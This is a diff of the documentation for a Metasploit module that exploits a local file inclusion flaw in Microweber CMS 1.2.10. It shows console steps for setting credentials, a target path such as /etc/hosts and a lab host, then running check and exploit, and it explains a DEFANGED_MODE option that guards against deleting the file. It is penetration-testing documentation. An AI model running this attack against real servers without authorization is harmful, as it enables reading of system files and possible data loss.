@@ -25,8 +25,9 @@ If you want, you can follow the steps in the official vulnerability report to re
 - [ ] Verify that you see `Downloading FILE from the backup folder.`
 
 ## Options
+
 ```
-msf6 auxiliary(gather/microweber_lfi) > options
+msf auxiliary(gather/microweber_lfi) > options
 
 Module options (auxiliary/gather/microweber_lfi):
 
@@ -44,27 +45,35 @@ Module options (auxiliary/gather/microweber_lfi):
    VHOST                             no        HTTP server virtual host
 ```
 
+### DEFANGED_MODE
+
+Defaults to `true`, which blocks file retrieval. Setting it to `false` allows the
+module to move the file specified by `LOCAL_FILE_PATH` into the application's
+backup directory to retrieve it. This may remove the file from its original
+location if the web service user has permission. Disable it only when that
+potential file loss is authorized.
+
 ## Scenerios
 This module has been tested against Microweber CMS v1.2.10 installed on Ubuntu.
 
 ```
-msf6 auxiliary(gather/microweber_lfi) > use auxiliary/gather/microweber_lfi
-msf6 auxiliary(gather/microweber_lfi) > set username admin
+msf auxiliary(gather/microweber_lfi) > use auxiliary/gather/microweber_lfi
+msf auxiliary(gather/microweber_lfi) > set username admin
 username => admin
-msf6 auxiliary(gather/microweber_lfi) > set password admin
+msf auxiliary(gather/microweber_lfi) > set password admin
 password => admin
-msf6 auxiliary(gather/microweber_lfi) > set local_file_path /etc/hosts
+msf auxiliary(gather/microweber_lfi) > set local_file_path /etc/hosts
 local_file_path => /etc/hosts
-msf6 auxiliary(gather/microweber_lfi) > set rhosts 192.168.188.132
+msf auxiliary(gather/microweber_lfi) > set rhosts 192.168.188.132
 rhosts => 192.168.188.132
-msf6 auxiliary(gather/microweber_lfi) > check
+msf auxiliary(gather/microweber_lfi) > check
 
 [*] Checking if it's Microweber CMS.
 [+] Microweber CMS has been detected.
 [*] Checking Microweber's version.
 [+] Microweber version 1.2.10
 [*] 192.168.188.132:80 - The target appears to be vulnerable.
-msf6 auxiliary(gather/microweber_lfi) > exploit
+msf auxiliary(gather/microweber_lfi) > exploit
 [*] Running module against 192.168.188.132
 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -76,9 +85,9 @@ msf6 auxiliary(gather/microweber_lfi) > exploit
 [-] Auxiliary aborted due to failure: bad-config: Triggering this vulnerability may delete the local file if the web service user has the permission.
 If you want to continue, disable the DEFANGED_MODE.
 => set DEFANGED_MODE false
-msf6 auxiliary(gather/microweber_lfi) > set defanged_mode false
+msf auxiliary(gather/microweber_lfi) > set defanged_mode false
 defanged_mode => false
-msf6 auxiliary(gather/microweber_lfi) > exploit
+msf auxiliary(gather/microweber_lfi) > exploit
 [*] Running module against 192.168.188.132
 
 [*] Running automatic check ("set AutoCheck false" to disable)
